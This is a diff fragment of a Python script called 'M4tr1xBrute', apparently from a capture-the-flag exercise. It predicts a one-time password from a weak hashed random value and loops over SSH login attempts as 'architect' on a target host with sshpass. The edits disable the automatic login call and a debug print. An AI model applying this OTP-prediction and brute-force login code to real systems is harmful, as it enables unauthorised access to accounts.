@@ -61,7 +61,7 @@ def getRandom():
     uc = ctt ^ random.choice(secretList)
     hc = (sha256(repr(uc).encode('utf-8')).hexdigest())
     t = hc[22:44]
-    print("M4tr1xBrute: getRandom: t = {}\n".format(t))
+    # print("M4tr1xBrute: getRandom: t = {}\n".format(t))
     return t
 
 while True:
@@ -76,10 +76,11 @@ while True:
         # output = subprocess.getoutput(f'gnome-terminal -x bash -c "sshpass -p {OTP} ssh {USER}@{RHOST}"')
         # exec(output)
         print("Execute this command: sshpass -p \'{}\' ssh architect@{}\n\n You have 60 seconds or less to run this command.".format(OTP,RHOST))
-        sshprocess = subprocess.Popen(["sshpass", "-p", "{}".format(OTP), "ssh", "architect@{}".format(RHOST)])
-        processExitCode = sshprocess.poll()
-        print("processExitCode = {}\n".format(processExitCode))
-        sys.exit()
+        # sshprocess = subprocess.Popen(["sshpass", "-p", "{}".format(OTP), "ssh", "architect@{}".format(RHOST)])
+        # processExitCode = sshprocess.poll()
+        # print("processExitCode = {}\n".format(processExitCode))
+        # sys.exit()
+        break
     except Exception as ex:
         print("Connection failed with: {}, trying again!\n".format(OTP))
         # tb.print_exc()
